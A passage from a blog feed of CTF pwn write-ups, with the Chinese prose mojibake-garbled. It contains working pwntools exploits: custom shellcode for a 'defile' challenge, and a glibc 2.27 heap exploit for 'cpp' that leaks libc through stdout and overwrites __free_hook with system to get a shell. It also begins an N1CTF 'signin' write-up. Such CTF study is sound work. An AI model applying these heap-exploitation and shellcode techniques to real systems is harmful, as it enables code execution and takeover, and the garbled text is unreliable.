class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">40001</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;INPUT YOUR TOKEN:&quot;</span>)</span><br><span class="line">        p.send(<span class="string">&quot;icq95bbff617706a68d47723be2f12b7&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./defile&quot;</span>)</span><br><span class="line">        <span class="comment"># debug(0x1A4F)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    shellcode=code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    and rdx,0xfffffffffffff000</span></span><br><span class="line"><span class="string">    add rdx,0xe</span></span><br><span class="line"><span class="string">    jmp rdx</span></span><br><span class="line"><span class="string">    xor rbx,rbx</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    and rdx,0xfffffffffffff000</span></span><br><span class="line"><span class="string">    mfence</span></span><br><span class="line"><span class="string">    mov byte ptr [rdx+0xfff],bl</span></span><br><span class="line"><span class="string">    mfence</span></span><br><span class="line"><span class="string">    mfence</span></span><br><span class="line"><span class="string">    loop_:</span></span><br><span class="line"><span class="string">        call check</span></span><br><span class="line"><span class="string">        mfence</span></span><br><span class="line"><span class="string">    call check</span></span><br><span class="line"><span class="string">    cmpw cx,0x200</span></span><br><span class="line"><span class="string">    jne find</span></span><br><span class="line"><span class="string">    inc bl</span></span><br><span class="line"><span class="string">    mfence</span></span><br><span class="line"><span class="string">    mov byte ptr [rdx+0xfff],bl</span></span><br><span class="line"><span class="string">    mfence</span></span><br><span class="line"><span class="string">    cmpb bl,0</span></span><br><span class="line"><span class="string">    jne loop_</span></span><br><span class="line"><span class="string">    find:</span></span><br><span class="line"><span class="string">    mov ax,cx</span></span><br><span class="line"><span class="string">    cmpw cx,0x100</span></span><br><span class="line"><span class="string">    jle l1</span></span><br><span class="line"><span class="string">    sub ax,0x100</span></span><br><span class="line"><span class="string">    jmp l2</span></span><br><span class="line"><span class="string">    l1:</span></span><br><span class="line"><span class="string">    add ax,0x100</span></span><br><span class="line"><span class="string">    l2:</span></span><br><span class="line"><span class="string">    mov r11,[rdx+rax*8]</span></span><br><span class="line"><span class="string">    mov qword ptr [rdx+rcx*8],r11</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edi,4</span></span><br><span class="line"><span class="string">    mov r12,rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    inc rdx</span></span><br><span class="line"><span class="string">    mov rax,rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov byte ptr [r12+0xffe],1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    mov rax,0xe7</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    check:</span></span><br><span class="line"><span class="string">    xor rcx,rcx</span></span><br><span class="line"><span class="string">    find_cc:</span></span><br><span class="line"><span class="string">    movabsqr11,-3689348814741910324</span></span><br><span class="line"><span class="string">    cmpq qword ptr [rdx + rcx*8],r11</span></span><br><span class="line"><span class="string">    je find_</span></span><br><span class="line"><span class="string">    inc rcx</span></span><br><span class="line"><span class="string">    cmpw cx,0x200</span></span><br><span class="line"><span class="string">    jne find_cc</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">    find_:</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    code=asm(shellcode).ljust(<span class="number">2046</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">    <span class="comment"># code=(asm(shellcode)).encode(&#x27;hex&#x27;)</span></span><br><span class="line">    p.send(<span class="string">&#x27;\x90&#x27;</span>+code+<span class="string">&#x27;\x90&#x27;</span>*<span class="number">2</span>+code[:-<span class="number">11</span>]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># p.recvuntil(&quot;SUCCEED&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># main(&quot;39.97.171.121&quot;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br></pre></td></tr></table></figure><h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><blockquote><p>Heap exploiting is so boring .</p></blockquote><p>ä¸€é“c++å†™çš„èœå•é¢˜ï¼Œç”±äºæ²¡æœ‰å¯¹æŒ‡é’ˆçš„æ¸…é›¶å¯¼è‡´æˆ‘ä»¬å¯ä»¥ä¸€ç›´deleï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸€ç›´deleæ¥å¡«æ»¡tecacheï¼Œä»è€Œè¿›å…¥fastibinã€‚</p><p>é¢˜ç›®é™åˆ¶äº†mallocçš„sizeï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨basic_stringæ‰©å®¹çš„è§„åˆ™æ¥è§¦å‘malloc_consolidateï¼Œæ¥å¾—åˆ°å­˜æ”¾æœ‰main_arenaçš„binsã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">create_des()</span><br><span class="line">create_des()</span><br><span class="line">create_des()</span><br><span class="line">write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    del_des()</span><br><span class="line">write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    del_des()</span><br><span class="line">write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    del_des()</span><br><span class="line">write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    del_des()</span><br><span class="line">write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  2]: 0x555a28604e90 â—‚â€” 0x555a28604e90</span><br><span class="line">0x30 [  1]: 0x555a28604f60 â—‚â€” 0x0</span><br><span class="line">0x40 [  7]: 0x555a28604eb0 â€”â–¸ 0x7f6268435cd0 (main_arena+144) â€”â–¸ 0x7f6268435cc0 (main_arena+128) â€”â–¸ 0x7f6268435cb0 (main_arena+112) â€”â–¸ 0x7f6268435ca0 (main_arena+96) â€”â–¸ 0x555a28605870 â—‚â€” 0x0</span><br><span class="line">0x50 [  1]: 0x555a28604f90 â—‚â€” 0x0</span><br><span class="line">0x60 [  7]: 0x555a28605160 â€”â–¸ 0x555a28604ea0 â—‚â€” 0x0</span><br><span class="line">0x70 [  7]: 0x555a28605070 â€”â–¸ 0x7f6268435de0 (main_arena+416) â€”â–¸ 0x7f6268435dd0 (main_arena+400) â€”â–¸ 0x7f6268435dc0 (main_arena+384) â€”â–¸ 0x7f6268435db0 (main_arena+368) â€”â–¸ 0x7f6268435da0 (main_arena+352) â€”â–¸ 0x7f6268435d90 (main_arena+336) â€”â–¸ 0x7f6268435d80 (main_arena+320) â—‚â€” ...</span><br><span class="line">0x80 [  7]: 0x555a286050e0 â—‚â€” 0x0</span><br><span class="line">0x90 [  1]: 0x555a28604fe0 â—‚â€” 0x0</span><br><span class="line">0x100 [  1]: 0x555a286051c0 â—‚â€” 0x0</span><br><span class="line">0x1f0 [  1]: 0x555a286052c0 â—‚â€” 0x0</span><br><span class="line">0x3d0 [  1]: 0x555a286054b0 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x40: 0x555a28604ea0 â€”â–¸ 0x7f6268435cd0 (main_arena+144) â—‚â€” 0x555a28604ea0</span><br><span class="line">0x150: 0x555a28605060 â€”â–¸ 0x7f6268435de0 (main_arena+416) â—‚â€” 0x555a28605060 /* &#x27;`P`(ZU&#x27; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯åŠ«æŒstdoutæ³„éœ²äº†ï¼Œåˆ©ç”¨small binå’Œ0x40çš„tecacheçš„overlopæ”¹main_arenaçš„åä½ä¸¤ä¸ªå­—èŠ‚ï¼Œä½†è¦å…ˆæŠŠ0x20çš„tecacheç”³è¯·å‡ºæ¥ã€‚</p><p>leakçš„æ—¶å€™æœ‰ä¸ªé—®é¢˜è¦æ³¨æ„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x30 [  1]: 0x561f2bafef60 â—‚â€” 0x0</span><br><span class="line">0x40 [  7]: 0x561f2bafeeb0 â€”â–¸ 0x7fc5c83ae758 (_IO_2_1_stderr_+216) â€”â–¸ 0x7fc5c83aa2a0 (_IO_file_jumps) â—‚â€” 0x0</span><br><span class="line">0x50 [  1]: 0x561f2bafef90 â—‚â€” 0x0</span><br><span class="line">0x60 [  7]: 0x561f2baff160 â€”â–¸ 0x561f2bafeea0 â—‚â€” 0x0</span><br><span class="line">0x70 [  7]: 0x561f2baff070 â€”â–¸ 0x7fc5c83adde0 (main_arena+416) â€”â–¸ 0x7fc5c83addd0 (main_arena+400) â€”â–¸ 0x7fc5c83addc0 (main_arena+384) â€”â–¸ 0x7fc5c83addb0 (main_arena+368) â€”â–¸ 0x7fc5c83adda0 (main_arena+352) â€”â–¸ 0x7fc5c83add90 (main_arena+336) â€”â–¸ 0x7fc5c83add80 (main_arena+320) â—‚â€” ...</span><br><span class="line">0x80 [  7]: 0x561f2baff0e0 â—‚â€” 0x0</span><br><span class="line">0x90 [  1]: 0x561f2bafefe0 â—‚â€” 0x0</span><br><span class="line">0x100 [  1]: 0x561f2baff1c0 â—‚â€” 0x0</span><br><span class="line">0x1f0 [  1]: 0x561f2baff2c0 â—‚â€” 0x0</span><br><span class="line">0x3d0 [  1]: 0x561f2baff4b0 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x561f2bafeec0 â€”â–¸ 0x7fc5c83adca0 (main_arena+96) â—‚â€” 0x561f2bafeec0</span><br><span class="line">smallbins</span><br><span class="line">0x150: 0x561f2baff060 â€”â–¸ 0x7fc5c83adde0 (main_arena+416) â—‚â€” 0x561f2baff060</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx 0x561f2bafeeb0-0x10</span><br><span class="line">0x561f2bafeea0:0x00000000000000000x0000000000000021</span><br><span class="line">0x561f2bafeeb0:0x00007fc5c83ae7580x00007fc5c83adcd0</span><br><span class="line">0x561f2bafeec0:0x61616161616161610x0000000000000021</span><br><span class="line">0x561f2bafeed0:0x00007fc5c83adca00x00007fc5c83adca0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨æ”¹äº†main_arenaä¹‹åunsortedbiné‡Œçš„binå’Œ0x40çš„ç¬¬ä¸€ä¸ªtecacheæ˜¯overlopçš„ï¼Œè¿™æ—¶å¦‚æœæˆ‘ä»¬ç›´æ¥å–0x40çš„tecacheå’Œè¯å°±åº”æ³¨æ„ä¸è¦æ”¹åunsorted binçš„ç»“æ„ï¼Œæˆ–è€…æˆ‘ä»¬å¯ä»¥å…ˆæŠŠunsortedbinç”³è¯·ç©ºåœ¨å–0x40çš„tecacheï¼Œè¿™æ ·å°±æ²¡ä»€ä¹ˆé—®é¢˜äº†ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;[B]ye&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_des</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_des</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;W&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_des</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./cpp&quot;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    create_des()</span><br><span class="line">    create_des()</span><br><span class="line">    create_des()</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_des()</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_des()</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_des()</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_des()</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line">    write_des(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    write_des(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="comment"># for i in range(4):</span></span><br><span class="line"><span class="comment"># del_des()</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    stdout=<span class="built_in">int</span>(raw_input(<span class="string">&quot;input: &quot;</span>),<span class="number">16</span>)</span><br><span class="line">    write_des(p16(stdout-<span class="number">8</span>))</span><br><span class="line">    write_des(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    write_des(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    libc.address=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ed8b0</span></span><br><span class="line">    success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    write_des(p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">    write_des(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">    write_des(<span class="string">&#x27;/bin/sh&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">    main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1CTF2020</title>
      <link href="/2020/10/28/N1CTF2020/"/>
      <url>/2020/10/28/N1CTF2020/</url>
      
        <content type="html"><![CDATA[<h3 id="N1CTF-Pwn-amp-Reéƒ¨åˆ†"><a href="#N1CTF-Pwn-amp-Reéƒ¨åˆ†" class="headerlink" title="N1CTF Pwn&amp;Reéƒ¨åˆ†"></a>N1CTF Pwn&amp;Reéƒ¨åˆ†</h3><blockquote><p>æ‹–äº†å¥½ä¹…çš„wpï¼Œå·®ç‚¹å’•å’•å’•äº†â°</p></blockquote><span id="more"></span><h4 id="sigin"><a href="#sigin" class="headerlink" title="sigin"></a>sigin</h4><p>è¿™é¢˜æˆ‘å¼€å§‹çš„æ€è·¯é”™äº†ï¼Œå…ˆå»åŠ«æŒtecache_structæ³„éœ²ï¼Œä¹‹åæ‰“free_hookçš„æ—¶å€™ä¹Ÿæ˜¯æ”¹çš„tecache_structï¼Œç”±äºtecache_structå’Œæˆ‘ä»¬ç”³è¯·çš„heapä¹‹é—´è¿˜æœ‰ä¸€ä¸ª0x1010çš„å †ï¼Œå¯¼è‡´åé¢å†å»è°ƒæ•´curæŒ‡é’ˆæ—¶ç–¯ç‹‚å¾ªç¯deleå¤§æ¦‚0x2000å¤šæ¬¡ğŸ¤¦ï¼Œæœ¬åœ°é€šäº†ï¼Œè¿œç¨‹GGï¼Œæ‰€ä»¥åé¢æ¢äº†ç§è§£æ³•0.0</p><p>å…ˆåˆ†æç¨‹åºé€»è¾‘ï¼ŒC++å†™çš„èœå•é¢˜ï¼Œä½¿ç”¨äº†vectoræ¥å­˜å‚¨æˆ‘ä»¬çš„æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¥æœ‰ä¸¤ä¸ªvectorã€‚</p><p>æ•°æ®ç»“æ„ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">con</span>&#123;</span></span><br><span class="line">  <span class="type">void</span> *begin;</span><br><span class="line">  <span class="type">void</span> *cur;</span><br><span class="line">  <span class="type">void</span> *end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“cur&#x3D;&#x3D;endæ—¶vectorä¼šè¿›è¡Œæ‰©å®¹çš„æ“ä½œï¼Œå…ˆç”³è¯·ä¸€ä¸ªæ›´å¤§çš„å †ï¼Œä¹‹åå°†æ•°æ®copyè¿‡å»ï¼Œå†å°†æ—§å †freeã€‚æ‰©å®¹å¤§å°ä¾æ¬¡ä¸º<code>0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010</code>(å°±å †çš„å¤§å°è€Œè¨€)</p><p>æ¼æ´åœ¨äºdeleæ—¶åªæ˜¯å°†curæŒ‡é’ˆå‡å°8ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡deleæ§åˆ¶curæŒ‡é’ˆï¼Œé…åˆaddå¯ä»»æ„åœ°å€å†™ã€‚</p><p>åˆ©ç”¨æ€è·¯ï¼š<br>1.é€šè¿‡ä¸æ–­addä½¿å¾—æ‰©å®¹freeçš„å †æ”¾å…¥unsorted bin<br>2.deleæ§åˆ¶curæŒ‡å‘unsortedbin-&gt;fdçš„åœ°å€ï¼Œé…åˆshowæ³„éœ²ã€‚<br>3.ä¹‹ååˆ©ç”¨vecortæ‰©å®¹çš„è§„å¾‹<code>0x20,0x20</code>ï¼Œå…ˆå°†åœ¨tecacheçš„0x20ä½ç½®çš„ç¬¬ä¸€ä¸ªbin1-&gt;fdå†™å¦‚__free_hook-8ï¼Œä¹‹åvector2å…ˆæ‹¿å‡ºbin1ã€‚è¿™é‡Œå†™å…¥str(0x68732f6e69622f)(å³â€™&#x2F;bin&#x2F;shâ€™)ï¼Œä¹‹å<code>add(2,str(libc.sym[&#39;system&#39;]))</code>,ç”±äºæ‰©å®¹ä»è€Œåœ¨free_hook-8å†™å…¥â€™&#x2F;bin&#x2F;shâ€™åŒæ—¶åŠ«æŒfree_hookä¸ºsystemã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span 